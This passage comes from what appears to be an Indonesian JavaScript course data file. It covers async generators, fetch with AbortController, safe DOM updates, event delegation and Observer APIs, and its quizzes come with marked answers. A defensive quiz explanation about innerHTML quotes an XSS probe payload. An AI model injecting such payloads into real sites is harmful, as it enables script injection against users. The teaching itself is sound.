<p>Gabungkan <code>async</code> dengan <code>function*</code> menjadi <strong>Async Generator (<code>async function*</code>)</strong>, dan konsumsilah hasilnya dengan sangat bersih menggunakan <strong><code>for await (const item of ...)</code></strong>:</p>
<pre>// Mengambil data API berhalaman (paginated API) secara bertahap sesuai kebutuhan:
async function* ambilSemuaHalamanModul(urlDasar) {
  let halaman = 1;

  while (true) {
    const res = await fetch(\`\${urlDasar}?page=\${halaman}\`);
    if (!res.ok) throw new Error(\`Gagal memuat halaman \${halaman}\`);

    const body = await res.json();
    if (!body.data || body.data.length === 0) {
      break; // Berhenti jika data sudah habis
    }

    // Serahkan potongan data halaman ini ke pemanggil
    yield body.data;

    if (!body.adaHalamanBerikutnya) break;
    halaman++;
  }
}

// Pemanggil cukup menggunakan 'for await...of' (dan bisa langsung 'break' kapan saja
// tanpa membuang kuota jaringan untuk halaman-halaman sisanya!):
async function cariModulPertamaYangCocok(kata) {
  for await (const daftarModulHalamanIni of ambilSemuaHalamanModul(&quot;/api/modul&quot;)) {
    const ketemu = daftarModulHalamanIni.find((m) =&gt; m.judul.includes(kata));
    if (ketemu) {
      return ketemu; // Begitu return/break, halaman API berikutnya tidak akan di-fetch!
    }
  }
  return null;
}</pre>
<h2>Latihan Praktik: Membagi Pemrosesan Data Besar dengan Generator <em>Chunking</em></h2>
<p>Buatlah berkas <code>generator-chunk.js</code> dan jalankan dengan Node.js:</p>
<ol><li>Buat fungsi generator <code>function* bagiMenjadiPotongan(daftar, ukuranPotongan)</code> yang menggunakan <code>yield daftar.slice(i, i + ukuranPotongan)</code> untuk memecah array besar menjadi kelompok-kelompok kecil tanpa menduplikasi seluruh array sekaligus.</li><li>Buat <em>async generator</em> <code>async function* prosesBatch(daftar, ukuran)</code> yang memberi jeda simulasi <code>50ms</code> per potongan, lalu konsumsi dengan <code>for await...of</code>.</li></ol>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Iterators_and_generators" rel="noopener">Iterators and generators — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Iterator" rel="noopener"><code>Iterator</code> (Iterator helpers) — MDN Web Docs</a></li><li><a href="https://tc39.es/ecma262/multipage/control-abstraction-objects.html" rel="noopener">Control abstraction objects (<code>Generator</code>, <code>AsyncGenerator</code>) — TC39 ECMAScript Specification</a></li></ul></div>
`,
    perintah: ["function*","Array","for...of",".next()","Map","Set"],
    kuis: [
        {"tanya":"Apa yang terjadi pada saat sebuah fungsi generator function* hitung() { console.log(\"Mulai\"); yield 1; } pertama kali dipanggil dengan const gen = hitung(); (sebelum gen.next() atau for...of dijalankan)?","opsi":["Teks \"Mulai\" langsung tercetak di konsol dan gen bernilai angka 1.","Tidak ada satu baris pun isi di dalam tubuh fungsi hitung() yang dieksekusi; pemanggilan hitung() hanya mengembalikan sebuah objek Generator dalam keadaan terjeda (suspended) yang siap dijalankan saat .next() atau for...of dipanggil.","Fungsi berjalan dalam utas latar belakang secara otomatis.","Mesin JavaScript melempar galat karena tidak ada pernyataan return."],"benar":1,"penjelasan":"Memanggil fungsi generator tidak langsung mengeksekusi tubuh fungsinya, melainkan mengembalikan objek Generator (iterator). Eksekusi baru dimulai ketika konsumen meminta nilai pertama melalui .next() atau for...of."},
        {"tanya":"Mengapa menulis while (true) { yield n++; } di dalam sebuah function* tidak menyebabkan peramban membeku (infinite loop), asalkan dikonsumsi dengan .take(5) atau dihentikan dengan break di dalam for...of?","opsi":["Karena JavaScript otomatis menghentikan semua while (true) setelah 100 putaran.","Karena setiap kali eksekusi mencapai pernyataan yield, fungsi generator langsung dijeda (paused) dan mengembalikan kendali ke pemanggil; putaran berikutnya hanya berjalan jika pemanggil meminta nilai selanjutnya.","Karena yield menghapus variabel n dari memori.","Karena function* hanya berjalan di sisi server."],"benar":1,"penjelasan":"Evaluasi pada generator bersifat malas (lazy / on-demand). Berbeda dengan perulangan while (true) biasa yang memonopoli Call Stack tanpa henti, yield menangguhkan bingkai eksekusi generator hingga nilai berikutnya benar-benar diminta."},
        {"tanya":"Sintaks manakah yang digunakan untuk melakukan perulangan terhadap nilai-nilai yang dihasilkan oleh sebuah **Async Generator (async function*)**?","opsi":["for (const item of asyncGen())","for await (const item of asyncGen())","asyncGen().forEach(await item => ...)","await Promise.all(asyncGen())"],"benar":1,"penjelasan":"Sebuah async function* mengembalikan AsyncGenerator yang metode .next()-nya menghasilkan Promise<{ value, done }>. Pernyataan for await (const item of ...) menunggu penyelesaian setiap Promise secara berurutan di tiap putaran iterasi."}
    ]
},
{
    id: 12,
    kategori: "3 · Asinkron & Iterasi",
    judul: "Fetch API, Pengolahan JSON, URLSearchParams, dan AbortController",
    tingkat: "Menengah", durasi: "9 mnt",
    tag: ["URLSearchParams","AbortController","fetch()"],
    ringkas: "Mengambil dan mengirim data melalui HTTP menggunakan fetch(), memahami mengapa response.ok wajib diperiksa secara eksplisit, menyusun parameter URL dengan URLSearchParams, serta membatalkan permintaan lambat dengan AbortController dan AbortSignal.timeout().",
    isi: `
<h2>1. Cara Kerja <code>fetch()</code> dan Mengapa Butuh Dua Kali <code>await</code></h2>
<p><strong>Fetch API</strong> adalah standar modern di peramban maupun runtime server (Node.js 18+) untuk melakukan permintaan jaringan HTTP berbasis <code>Promise</code>.</p>
<p>Hal pertama yang sering membingungkan pemula adalah mengapa mengambil data dengan <code>fetch()</code> membutuhkan <strong>dua kali <code>await</code></strong>:</p>
<pre>async function ambilDaftarKelas() {
  // await pertama: Menunggu HEADER respons HTTP tiba dari server (status 200, Content-Type, dsb.)
  const respons = await fetch(&quot;https://kodeloka.asadinedu.com/data/catalog.json&quot;);

  // Wajib periksa apakah kode status berada di rentang sukses 200–299!
  if (!respons.ok) {
    throw new Error(\`Permintaan gagal dengan status HTTP \${respons.status}\`);
  }

  // await kedua: Menunggu aliran isi BODY selesai diunduh dan diurai sebagai objek JSON
  const data = await respons.json();
  return data;
}</pre>
<h3>Jebakan Paling Umum: <code>fetch()</code> TIDAK Melempar Galat pada Status <code>404</code> atau <code>500</code>!</h3>
<p>Berbeda dengan beberapa pustaka pihak ketiga, <code>fetch()</code> <strong>hanya</strong> akan menolak (<em>reject</em>) <code>Promise</code>-nya apabila terjadi <strong>kegagalan jaringan tingkat bawah</strong> (misalnya perangkat pengguna terputus dari internet, resolusi DNS gagal, atau permintaan dibatalkan).</p>
<p>Jika server membalas dengan kode status <strong><code>404 Not Found</code></strong>, <strong><code>401 Unauthorized</code></strong>, atau <strong><code>500 Internal Server Error</code></strong>, <code>fetch()</code> menganggap komunikasi jaringan berhasil dan **tetap me-<em>resolve</em> Promise menjadi objek <code>Response</code><strong> (dengan <code>respons.ok</code> bernilai <code>false</code>)! Oleh karena itu, selalu tulis pemeriksaan </strong><code>if (!respons.ok)</code>** sebelum memanggil <code>await respons.json()</code>.</p>
<h2>2. Mengirim Data dengan <code>POST</code>, Header, dan <code>FormData</code></h2>
<h3>A. Mengirim Payload JSON (<code>Content-Type: application/json</code>)</h3>
<p>Ketika mengirim objek JavaScript sebagai JSON melalui metode <code>POST</code>, <code>PUT</code>, atau <code>PATCH</code>, Anda harus mengubah objek menjadi string menggunakan <code>JSON.stringify()</code> dan mencantumkan header <code>Content-Type: application/json</code>:</p>
<pre>async function simpanProgresModul(idModul, skorKuis) {
  const respons = await fetch(&quot;/api/progres&quot;, {
    method: &quot;POST&quot;,
    headers: {
      &quot;Content-Type&quot;: &quot;application/json&quot;,
      &quot;Accept&quot;: &quot;application/json&quot;
    },
    body: JSON.stringify({
      modul_id: idModul,
      skor: skorKuis,
      waktu: new Date().toISOString()
    })
  });

  if (!respons.ok) {
    const rincianGalat = await respons.json().catch(() =&gt; null);
    throw new Error(rincianGalat?.pesan ?? \`Gagal menyimpan (HTTP \${respons.status})\`);
  }

  return await respons.json();
}</pre>
<h3>B. Mengirim Formulir atau Berkas dengan <code>FormData</code></h3>
<p>Jika Anda mengambil data langsung dari elemen <code>&lt;form&gt;</code> di HTML (termasuk unggahan berkas <code>&lt;input type=&quot;file&quot;&gt;</code>), gunakan objek <strong><code>FormData</code></strong>:</p>
<pre>async function kirimFormulirPendaftaran(elemenForm) {
  const dataForm = new FormData(elemenForm);

  const respons = await fetch(&quot;/api/pendaftaran&quot;, {
    method: &quot;POST&quot;,
    // PENTING: JANGAN mengatur header Content-Type secara manual saat mengirim FormData!
    // Peramban otomatis mengatur Content-Type: multipart/form-data beserta string 'boundary' uniknya.
    body: dataForm
  });

  if (!respons.ok) throw new Error(\`Gagal mengirim formulir: \${respons.status}\`);
  return await respons.json();
}</pre>
<h2>3. Merangkai Parameter Query Secara Aman dengan <code>URL</code> dan <code>URLSearchParams</code></h2>
<p>Jangan pernah menyambung parameter URL secara manual dengan string template seperti \`<code> </code>/api/cari?q=\${kataKunci}<code> </code><code>! Jika pengguna mengetik kata kunci </code>&quot;C++ &amp; Go&quot;<code>, karakter </code>&amp;<code> dan </code>+\` akan merusak struktur parameter URL Anda.</p>
<p>Gunakan antarmuka standar <strong><code>URL</code></strong> dan <strong><code>URLSearchParams</code></strong> yang otomatis mengodekan karakter khusus (<em>URL-encoding</em>) dengan aman:</p>
<pre>function buatUrlPencarian(kataKunci, bidang = &quot;semua&quot;, halaman = 1) {
  const url = new URL(&quot;https://kodeloka.asadinedu.com/api/kelas&quot;);
  url.searchParams.set(&quot;q&quot;, kataKunci);
  url.searchParams.set(&quot;bidang&quot;, bidang);
  url.searchParams.set(&quot;page&quot;, String(halaman));

  return url.toString();
}

console.log(buatUrlPencarian(&quot;Git &amp; CI/CD&quot;, &quot;infra&quot;, 1));
// Keluaran aman: &quot;https://kodeloka.asadinedu.com/api/kelas?q=Git+%26+CI%2FCD&amp;bidang=infra&amp;page=1&quot;</pre>
<h2>4. Membatalkan Permintaan dan Mengatur Batas Waktu (<code>AbortController</code> &amp; <code>AbortSignal.timeout</code>)</h2>
<p>Tanpa batas waktu (<em>timeout</em>), permintaan <code>fetch()</code> ke server yang sedang macet dapat menggantung selama lebih dari satu menit. Selain itu, pada fitur pencarian langsung (<em>live search</em>), ketika pengguna mengetik huruf baru, permintaan pencarian dari huruf sebelumnya harus dibatalkan agar balasannya yang terlambat tidak menimpa hasil terbaru (<em>race condition</em>).</p>
<h3>A. Batas Waktu Otomatis Satu Baris dengan <code>AbortSignal.timeout()</code></h3>
<p>Sejak April 2024 (status <strong>Baseline Newly Available</strong>), Anda tidak perlu lagi membuat <code>setTimeout</code> manual untuk membatalkan <code>fetch()</code>. Cukup pasang <strong><code>signal: AbortSignal.timeout(milidetik)</code></strong>:</p>
<pre>async function ambilDataDenganBatasWaktu(url, batasMs = 5000) {
  try {
    const respons = await fetch(url, {
      signal: AbortSignal.timeout(batasMs)
    });
    if (!respons.ok) throw new Error(\`Status HTTP: \${respons.status}\`);
    return await respons.json();
  } catch (err) {
    if (err.name === &quot;TimeoutError&quot;) {
      throw new Error(\`Permintaan ke server melebihi batas waktu \${batasMs} ms.\`);
    }
    if (err.name === &quot;AbortError&quot;) {
      throw new Error(&quot;Permintaan dibatalkan oleh pengguna.&quot;);
    }
    throw err;
  }
}</pre>
<h3>B. Pembatalan Manual untuk <em>Live Search</em> dengan <code>AbortController</code></h3>
<pre>let pengendaliAktif = null;

async function cariMateriLangsung(kataKunci) {
  // Jika masih ada permintaan sebelumnya yang belum selesai, batalkan sekarang!
  if (pengendaliAktif) {
    pengendaliAktif.abort();
  }

  pengendaliAktif = new AbortController();

  const url = new URL(&quot;/api/materi&quot;, window.location.origin);
  url.searchParams.set(&quot;q&quot;, kataKunci);

  const respons = await fetch(url, {
    signal: pengendaliAktif.signal
  });
  if (!respons.ok) throw new Error(\`HTTP \${respons.status}\`);
  return await respons.json();
}</pre>
<h2>Latihan Praktik: Klien HTTP Tangguh dengan <code>URLSearchParams</code> dan Timeout</h2>
<p>Buatlah berkas <code>klien-api.js</code> yang mengekspor fungsi <code>ambilModul(filterObjek, timeoutMs = 4000)</code>:</p>
<ol><li>Gunakan <code>new URLSearchParams(filterObjek)</code> untuk merangkai parameter query dengan aman.</li><li>Panggil <code>fetch()</code> dengan <code>signal: AbortSignal.timeout(timeoutMs)</code> dan header <code>Accept: application/json</code>.</li><li>Periksa <code>respons.ok</code> dan tangani pembedaan antara <code>TimeoutError</code> dan galat HTTP biasa secara rapi.</li></ol>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch" rel="noopener">Using the Fetch API — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API" rel="noopener">Fetch API — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Response" rel="noopener"><code>Response</code> — MDN Web Docs</a></li></ul></div>
`,
    perintah: ["fetch()","FormData","URLSearchParams","await","Promise","respons.ok"],
    kuis: [
        {"tanya":"Apa yang terjadi ketika await fetch(\"/api/data-rahasia\") menerima balasan dari server dengan kode status 403 Forbidden?","opsi":["fetch() langsung melempar galat yang masuk ke blok catch.","fetch() tetap berhasil (fulfilled) dan mengembalikan objek Response dengan properti response.status === 403 dan response.ok === false.","fetch() secara otomatis mengulang permintaan sebanyak 3 kali.","fetch() mengembalikan nilai null."],"benar":1,"penjelasan":"fetch() hanya menolak (reject) Promise jika terjadi kegagalan jaringan atau pembatalan request. Semua balasan HTTP yang valid dari server (termasuk kode 4xx dan 5xx) menghasilkan objek Response yang fulfilled, sehingga kita wajib memeriksa if (!response.ok)."},
        {"tanya":"Mengapa Anda tidak boleh menetapkan header \"Content-Type\": \"multipart/form-data\" secara manual di dalam opsi headers ketika mengirim objek FormData melalui fetch()?","opsi":["Karena FormData hanya boleh dikirim menggunakan metode GET.","Karena peramban perlu menghasilkan dan menyisipkan parameter wajib boundary=... yang unik pada header Content-Type; jika Anda menimpanya secara manual tanpa string boundary yang cocok, server tidak akan bisa memisahkan bagian-bagian berkas di dalamnya.","Karena fetch() tidak mendukung pengiriman objek FormData.","Karena multipart/form-data otomatis mengubah berkas menjadi teks JSON."],"benar":1,"penjelasan":"Saat body diisi dengan instans FormData, peramban secara otomatis menyusun header lengkap seperti Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW. Menimpa header tersebut secara manual akan menghilangkan informasi boundary tersebut."},
        {"tanya":"Cara manakah yang paling ringkas dan modern (Baseline Newly Available) untuk membatalkan permintaan fetch(url) secara otomatis apabila server tidak merespons dalam waktu 3 detik (3000 ms)?","opsi":["fetch(url, { timeout: 3000 })","fetch(url, { signal: AbortSignal.timeout(3000) })","fetch(url, { maxWait: \"3s\" })","window.stopFetch(3000)"],"benar":1,"penjelasan":"Opsi fetch() tidak memiliki properti timeout langsung, melainkan menerima objek AbortSignal pada properti signal. Metode statis AbortSignal.timeout(3000) membuat sinyal yang otomatis membatalkan permintaan dengan TimeoutError setelah 3000 milidetik."}
    ]
},
{
    id: 13,
    kategori: "4 · DOM & Peramban",
    judul: "Manipulasi DOM yang Aman, Siklus Event, dan Event Delegation",
    tingkat: "Menengah", durasi: "9 mnt",
    tag: ["<button>","<ul>","<li>"],
    ringkas: "Memilih dan memodifikasi elemen DOM menggunakan API modern (querySelector, classList, dataset, createElement, replaceChildren), memahami perambatan event (bubbling & capturing), serta mengoptimalkan kinerja dengan pola Event Delegation.",
    isi: `
<h2>1. Memilih Elemen di Pohon DOM (<code>querySelector</code> &amp; <code>querySelectorAll</code>)</h2>
<p>Ketika peramban mengurai HTML menjadi pohon **DOM (<em>Document Object Model</em>)**, JavaScript dapat mencari elemen menggunakan selektor CSS apa pun melalui dua metode utama:</p>
<ol><li><strong><code>document.querySelector(selektor)</code>:</strong> Mengembalikan <strong>satu elemen pertama</strong> yang cocok dengan selektor CSS tersebut, atau <strong><code>null</code></strong> jika tidak ditemukan.</li><li><strong><code>document.querySelectorAll(selektor)</code>:</strong> Mengembalikan <strong><code>NodeList</code> statis</strong> berisi seluruh elemen yang cocok (dapat langsung diiterasi dengan <code>for...of</code>, atau diubah menjadi <code>Array</code> dengan <code>Array.from(nodeList)</code> jika Anda butuh <code>.map()</code> / <code>.filter()</code>).</li></ol>
<pre>// Mencari satu elemen berdasarkan ID atau atribut
const formulir = document.querySelector(&quot;#form-kontak&quot;);
const tombolAktif = document.querySelector('button[aria-current=&quot;page&quot;]');

// Mencari di dalam sub-pohon elemen tertentu (lebih cepat &amp; terfokus!)
const semuaInputWajib = formulir.querySelectorAll(&quot;input[required], textarea[required]&quot;);

for (const input of semuaInputWajib) {
  console.log(input.name);
}</pre>
<h2>2. Membaca dan Mengubah Elemen, Kelas, dan Atribut <code>data-*</code></h2>
<h3>A. Mengubah Teks: Gunakan <code>textContent</code>, Hindari <code>innerHTML</code>!</h3>
<ul><li><strong><code>elemen.textContent = teksBaru</code>:</strong> Mengatur isi teks murni secara cepat dan <strong>100% aman dari celah injeksi skrip (XSS)</strong> karena karakter <code>&lt;script&gt;</code> akan diperlakukan sebagai teks biasa, bukan dijalankan sebagai tag HTML!</li><li><strong><code>elemen.innerHTML = htmlString</code>:</strong> Mengurai ulang string sebagai tag HTML. <strong>Jangan pernah memasukkan data yang berasal dari pengguna atau URL ke dalam <code>innerHTML</code>!</strong></li></ul>
<h3>B. Mengelola Kelas CSS dengan <code>classList</code> dan Data dengan <code>dataset</code></h3>
<pre>const kartu = document.querySelector(&quot;.kartu-modul&quot;);

// 1. Mengelola class tanpa merusak class lain yang sudah ada di elemen tersebut
kartu.classList.add(&quot;kartu--terpilih&quot;);
kartu.classList.remove(&quot;kartu--redup&quot;);
kartu.classList.toggle(&quot;kartu--terbuka&quot;, statusTerbuka); // Parameter ke-2 memaksa tambah/hapus berdasarkan boolean!

// 2. Membaca dan menulis atribut data-* (mis. data-modul-id=&quot;10&quot; &lt;-&gt; dataset.modulId)
const idModul = Number(kartu.dataset.modulId);
kartu.dataset.statusBaca = &quot;selesai&quot;; // Menghasilkan atribut data-status-baca=&quot;selesai&quot; di HTML</pre>
<h2>3. Membuat, Menyisipkan, dan Mengganti Elemen Secara Efisien</h2>
<p>Untuk merakit elemen baru secara aman dan cepat:</p>
<pre>function buatItemModul({ id, judul, tingkat }) {
  const li = document.createElement(&quot;li&quot;);
  li.className = &quot;item-modul&quot;;
  li.dataset.id = String(id);

  const tautan = document.createElement(&quot;a&quot;);
  tautan.href = \`#modul-\${id}\`;
  tautan.textContent = judul;

  const lencana = document.createElement(&quot;span&quot;);
  lencana.className = &quot;lencana&quot;;
  lencana.textContent = tingkat;

  // .append() dapat menerima beberapa elemen sekaligus maupun teks biasa!
  li.append(tautan, &quot; &quot;, lencana);
  return li;
}

// Merender daftar 50 item sekaligus ke dalam &lt;ul&gt; dengan satu kali pembaruan DOM:
const wadahDaftar = document.querySelector(&quot;#daftar-modul&quot;);
const elemenBaru = daftarData.map(buatItemModul);

// replaceChildren() mengosongkan isi lama sekaligus memasukkan seluruh elemen baru dalam satu langkah!
wadahDaftar.replaceChildren(...elemenBaru);</pre>
<div class="callout info"><div class="callout-judul">💡 Keunggulan <code>elemen.replaceChildren(...anakBaru)</code></div><p>Daripada mengosongkan daftar dengan <code>wadah.innerHTML = &quot;&quot;</code> lalu memanggil <code>appendChild()</code> berulang-ulang di dalam perulangan (yang memicu perhitungan tata letak berulang kali), <code>wadah.replaceChildren(...elemenBaru)</code> (status <strong>Baseline Widely Available</strong>) mengganti seluruh anak elemen secara atomik dan jauh lebih rapi!</p></div>
<h2>4. Menangani Event, <em>Event Bubbling</em>, dan Pola <em>Event Delegation</em></h2>
<p>Gunakan <strong><code>elemen.addEventListener(tipeEvent, fungsiHandler)</code></strong> untuk merespons interaksi pengguna (seperti <code>&quot;click&quot;</code>, <code>&quot;submit&quot;</code>, <code>&quot;input&quot;</code>, <code>&quot;keydown&quot;</code>).</p>
<h3>Bagaimana Event Merambat di Pohon DOM? (<em>Capturing</em> &amp; <em>Bubbling</em>)</h3>
<p>Ketika pengguna mengeklik sebuah <code>&lt;button&gt;</code> yang berada di dalam <code>&lt;li&gt;</code> → <code>&lt;ul&gt;</code> → <code>&lt;main&gt;</code> → <code>&lt;body&gt;</code>:</p>
<ol><li><strong>Fase Capturing (Turun):</strong> Event berjalan turun dari <code>window</code> → <code>document</code> → <code>&lt;body&gt;</code> → <code>&lt;main&gt;</code> → <code>&lt;ul&gt;</code> → <code>&lt;li&gt;</code>.</li><li><strong>Fase Target:</strong> Event tiba di <code>&lt;button&gt;</code> yang diklik.</li><li><strong>Fase Bubbling (Menggelembung Naik — Bawaan):</strong> Event merambat naik kembali ke atas melalui <code>&lt;li&gt;</code> → <code>&lt;ul&gt;</code> → <code>&lt;main&gt;</code> → <code>&lt;body&gt;</code> → <code>document</code>!</li></ol>
<pre>          [ document ]
            │      ▲
  1. Capture│      │3. Bubble (Secara bawaan addEventListener mendengarkan di fase ini!)
            ▼      │
           [  &lt;ul&gt;  ]  &lt;-- Pasang SATU event listener di sini (Event Delegation!)
            │      ▲
            ▼      │
           [  &lt;li&gt;  ]
            │      ▲
            ▼      │
         [ &lt;button&gt; ]  &lt;-- 2. Target yang diklik pengguna</pre>
<h3>Kekuatan <em>Event Delegation</em> dengan <code>event.target.closest()</code></h3>
<p>Bayangkan Anda memiliki daftar <code>&lt;ul&gt;</code> yang berisi <strong>200 tombol hapus item</strong>, dan item baru dapat ditambahkan secara dinamis kapan saja.</p>
<ul><li><strong>Cara Buruk:</strong> Memasang 200 <code>addEventListener(&quot;click&quot;, ...)</code> pada masing-masing tombol (boros memori, dan tombol yang baru ditambahkan belakangan tidak akan memiliki event listener!).</li><li>**Cara Terbaik (<em>Event Delegation</em>):<strong> Pasang </strong>cukup SATU <code>addEventListener</code> pada elemen induk <code>&lt;ul&gt;</code><strong>, lalu gunakan </strong><code>event.target.closest(&quot;button.tombol-hapus&quot;)</code>** untuk mendeteksi tombol mana yang baru saja diklik!</li></ul>
<pre>const daftarTugas = document.querySelector(&quot;#daftar-tugas&quot;);

daftarTugas.addEventListener(&quot;click&quot;, (event) =&gt; {
  // .closest() mencari ke diri sendiri atau ke induk terdekat jika yang terklik adalah &lt;svg&gt; di dalam &lt;button&gt;!
  const tombolHapus = event.target.closest(&quot;button[data-aksi='hapus']&quot;);

  // Jika klik terjadi di luar tombol hapus, abaikan
  if (!tombolHapus || !daftarTugas.contains(tombolHapus)) return;

  const barisItem = tombolHapus.closest(&quot;li&quot;);
  const idTugas = barisItem?.dataset.id;

  console.log(\`Menghapus tugas #\${idTugas}\`);
  barisItem?.remove();
});</pre>
<div class="callout waspada"><div class="callout-judul">⚠️ Mengapa Wajib Menggunakan <code>event.target.closest(&quot;button&quot;)</code> dan Bukan <code>event.target</code> Saja?</div><p>Di dalam <code>&lt;button&gt;</code>, sering kali terdapat elemen anak seperti <code>&lt;span&gt;</code> atau ikon <code>&lt;svg&gt;</code>. Saat pengguna mengeklik tepat di atas gambar ikon <code>&lt;svg&gt;</code>, maka <strong><code>event.target</code> adalah elemen <code>&lt;svg&gt;</code> tersebut, bukan <code>&lt;button&gt;</code>!</strong> Dengan <code>event.target.closest(&quot;button&quot;)</code>, pencarian akan naik dari <code>&lt;svg&gt;</code> ke elemen <code>&lt;button&gt;</code> pembungkusnya secara akurat.</p></div>
<h2>Latihan Praktik: Daftar Catatan Belajar Interaktif dengan Event Delegation</h2>
<p>Buatlah berkas <code>dom-catatan.html</code> dan <code>catatan.js</code>:</p>
<ol><li>Buat formulir <code>&lt;form id=&quot;form-catatan&quot;&gt;</code> dengan input teks untuk menambah catatan baru ke dalam <code>&lt;ul id=&quot;daftar-catatan&quot;&gt;</code> (gunakan <code>event.preventDefault()</code> pada event <code>&quot;submit&quot;</code> agar halaman tidak memuat ulang).</li><li>Setiap item <code>&lt;li&gt;</code> dibuat menggunakan <code>document.createElement</code> dan <code>textContent</code>, dilengkapi tombol <em>Tandai Selesai</em> (<code>data-aksi=&quot;selesai&quot;</code>) dan tombol <em>Hapus</em> (<code>data-aksi=&quot;hapus&quot;</code>).</li><li>Gunakan <strong>satu</strong> event listener pada <code>#daftar-catatan</code> (<em>Event Delegation</em>) untuk menangani kedua tombol aksi tersebut.</li></ol>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model" rel="noopener">Document Object Model (DOM) — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener" rel="noopener"><code>EventTarget: addEventListener()</code> method — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Event" rel="noopener"><code>Event</code> — MDN Web Docs</a></li></ul></div>
`,
    perintah: ["<button>","<ul>","<li>","<svg>","<main>","<body>"],
    kuis: [
        {"tanya":"Apa perbedaan antara event.target dan event.currentTarget di dalam fungsi event handler yang menggunakan pola Event Delegation pada elemen <ul id=\"daftar\">?","opsi":["Keduanya selalu menunjuk ke elemen <ul>.","event.target adalah elemen paling spesifik tempat interaksi benar-benar terjadi (misalnya <button> atau <svg> yang diklik), sedangkan event.currentTarget adalah elemen tempat addEventListener dipasang (yaitu <ul id=\"daftar\">).","event.currentTarget hanya tersedia pada event papan ketik, sedangkan event.target pada event tetikus.","event.target menunjuk ke elemen <body>."],"benar":1,"penjelasan":"Saat event menggelembung (bubbling) naik ke atas, event.target tetap menunjuk ke elemen terdalam yang memicu event, sementara event.currentTarget menunjuk ke elemen pemilik listener yang sedang mengeksekusi callback saat ini."},
        {"tanya":"Mengapa event.target.closest(\"button.aksi\") jauh lebih andal daripada memeriksa event.target.matches(\"button.aksi\") saat menerapkan Event Delegation?","opsi":["Karena .matches() sudah dihapus dari spesifikasi DOM.","Karena jika di dalam <button class=\"aksi\"> terdapat elemen anak seperti <svg> atau <span> dan pengguna mengeklik tepat di atas ikon <svg> tersebut, event.target adalah <svg>; metode .closest(\"button.aksi\") akan menelusuri naik hingga menemukan elemen <button class=\"aksi\"> pembungkusnya.","Karena .closest() otomatis memanggil event.preventDefault().","Karena .closest() mencari elemen saudara (sibling) di sebelah kanan."],"benar":1,"penjelasan":"elemen.closest(selektor) memeriksa elemen itu sendiri terlebih dahulu, lalu apabila belum cocok, ia menelusuri rantai induknya ke atas hingga menemukan elemen yang cocok (atau mengembalikan null). Hal ini menyelesaikan masalah klik pada ikon atau teks di dalam tombol."},
        {"tanya":"Mengapa kita harus mengutamakan elemen.textContent = inputPengguna daripada elemen.innerHTML = inputPengguna ketika menampilkan teks yang berasal dari masukan pengguna?","opsi":["Karena innerHTML tidak dapat menampilkan angka.","Karena textContent memasukkan nilai sebagai teks murni tanpa mengurainya sebagai markup HTML, sehingga mencegah eksekusi tag <script> atau atribut berbahaya (Cross-Site Scripting / XSS).","Karena textContent otomatis menerjemahkan teks ke Bahasa Indonesia.","Karena innerHTML hanya bekerja pada elemen <div>."],"benar":1,"penjelasan":"innerHTML memicu parser HTML yang dapat mengeksekusi muatan berbahaya seperti <img src=\"x\" onerror=\"alert(1)\">. Sebaliknya, textContent lebih cepat karena melewati parser HTML dan memperlakukan seluruh karakter sebagai teks literal yang aman."}
    ]
},
{
    id: 14,
    kategori: "4 · DOM & Peramban",
    judul: "Mengamati Perubahan DOM & Layar secara Efisien: IntersectionObserver, ResizeObserver, dan MutationObserver",
    tingkat: "Lanjut", durasi: "8 mnt",
    tag: ["IntersectionObserver","ResizeObserver","MutationObserver"],
    ringkas: "Menggantikan penyadapan event scroll dan resize yang membebani CPU dengan tiga Observer API modern peramban: IntersectionObserver (visibilitas elemen di layar), ResizeObserver (perubahan dimensi elemen), dan MutationObserver (perubahan pohon DOM).",
    isi: `
<h2>Mengapa <code>window.addEventListener(&quot;scroll&quot;, ...)</code> dan <code>getBoundingClientRect()</code> Buruk bagi Performa?</h2>
<p>Di masa lalu, untuk mengetahui apakah pengguna sudah menggulir sampai ke bagian bawah daftar (<em>infinite scroll</em>) atau untuk menandai bab mana yang sedang aktif di daftar isi samping (<em>scrollspy</em>), pengembang memasang <code>window.addEventListener(&quot;scroll&quot;, ...)</code>, lalu di dalamnya memanggil <code>elemen.getBoundingClientRect()</code> puluhan kali per detik.</p>
<p>Masalahnya:</p>
<ol><li>Event <code>scroll</code> ditembakkan secara bertubi-tubi pada utas utama (<em>main thread</em>).</li><li>Memanggil <code>getBoundingClientRect()</code> memaksa peramban menghitung ulang tata letak seluruh halaman secara sinkron (<strong>Forced Synchronous Layout</strong>), sehingga guliran layar terasa patah-patah!</li></ol>
<p>Peramban modern menyediakan <strong>tiga Observer API asinkron</strong> yang sangat hemat baterai dan tidak pernah memblokir guliran layar!</p>
<h2>1. <code>IntersectionObserver</code>: Mendeteksi Kapan Elemen Masuk atau Keluar Layar</h2>
<p><strong><code>IntersectionObserver</code></strong> (status <strong>Baseline Widely Available</strong>) memungkinkan Anda mendaftarkan fungsi callback yang <strong>hanya dipanggil ketika sebuah elemen target mulai masuk atau keluar dari area pandang layar</strong> (atau wadah gulir tertentu):</p>
<pre>// Contoh Nyata: Menandai bab yang sedang dibaca pada Daftar Isi samping (Scrollspy)
// dan memuat data tambahan saat elemen pemicu di bagian bawah terlihat!
const daftarBab = document.querySelectorAll(&quot;main section[id]&quot;);

const pengamatVisibilitas = new IntersectionObserver(
  (daftarEntri) =&gt; {
    for (const entri of daftarEntri) {
      // entri.isIntersecting bernilai true jika elemen masuk ke zona pengamatan
      if (entri.isIntersecting) {
        const idAktif = entri.target.id;
        console.log(\`Pengguna sedang membaca bagian: #\${idAktif}\`);
      }
    }
  },
  {
    root: null, // null berarti mengamati terhadap viewport layar utama
